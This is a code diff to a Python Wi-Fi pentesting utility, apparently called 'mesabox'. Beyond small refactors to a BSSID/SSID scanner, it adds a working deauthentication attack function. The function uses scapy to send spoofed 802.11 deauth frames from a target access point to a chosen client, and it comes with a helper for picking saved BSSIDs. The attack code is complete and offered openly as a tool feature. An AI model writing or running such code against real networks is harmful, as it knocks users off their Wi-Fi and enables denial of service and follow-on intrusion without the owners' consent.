@@ -3,10 +3,15 @@ import re
 import json
 import os
 import shutil
+import platform
+from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
 
-BSSID_JSON_PATH = "/home/thomas/pentest/bssid_list.json"
+BSSID_JSON_PATH = os.path.expanduser("~/.mesabox_bssid_list.json")
 
 def scan_bssid(interface="wlan0", save=False):
+    if platform.system().lower() == "windows":
+        print("[ERROR] Wi-Fi BSSID/SSID scan is not supported on Windows.")
+        return []
     print(f"[INFO] Starting BSSID/SSID scan on {interface}")
     bssid_ssid_list = []
     scan_output = None
@@ -64,11 +69,6 @@ def scan_bssid(interface="wlan0", save=False):
             return []
     else:
         print("[ERROR] Neither 'iwlist' nor 'iw' found in PATH.")
-        print("On Linux, install with:")
-        print("  sudo apt install wireless-tools   # Debian/Ubuntu")
-        print("  sudo pacman -S wireless_tools     # Arch/Manjaro")
-        print("  sudo dnf install iw               # Fedora/RHEL")
-        print("  sudo zypper install wireless-tools # openSUSE")
         return []
 
     if not bssid_ssid_list:
@@ -103,13 +103,31 @@ def load_bssid_list():
         print(f"[ERROR] Loading JSON: {e}")
         return []
 
-if __name__ == "__main__":
-    iface = input("Wi-Fi interface name (e.g. wlan0): ") or "wlan0"
-    action = input("Do you want to scan (s) or load from file (l)? ")
-    if action.lower() == 's':
-        save_option = input("Do you want to save the result to a JSON file? (y/n) ")
-        scan_bssid(iface, save=(save_option.lower() == 'y'))
-    elif action.lower() == 'l':
-        load_bssid_list()
-    else:
-        print("Unrecognized action.")
+def deauth_attack(target_bssid, client_mac, interface="wlan0", count=100):
+    import os, sys
+    if platform.system().lower() == "windows":
+        print("[ERROR] Deauth attack is not supported on Windows.")
+        return
+    print(f"[INFO] Preparing deauth attack on {interface}")
+    if os.geteuid() != 0:
+        print("[ERROR] This attack requires root privileges (sudo).")
+        print("Run with sudo: sudo python3 mesabox_cli.py")
+        sys.exit(1)
+    print(f"[INFO] Sending {count} deauth packets on {interface} from {target_bssid} to {client_mac}...")
+    sendp(RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(),
+          iface=interface, count=count, inter=0.1, verbose=1)
+    print("[INFO] Deauth attack finished.")
+
+def select_bssid_from_list(bssid_list):
+    print("[INFO] Selecting a saved BSSID...")
+    if not bssid_list:
+        print("No saved BSSID.")
+        return None
+    print("Select a BSSID:")
+    for idx, entry in enumerate(bssid_list):
+        print(f"{idx+1}. {entry['bssid'][:17]} - {entry['ssid']}")
+    choice = input("BSSID number to use (or enter to cancel): ")
+    if not choice.isdigit() or not (1 <= int(choice) <= len(bssid_list)):
+        print("Cancelled.")
+        return None
+    return bssid_list[int(choice)-1]['bssid'][:17]
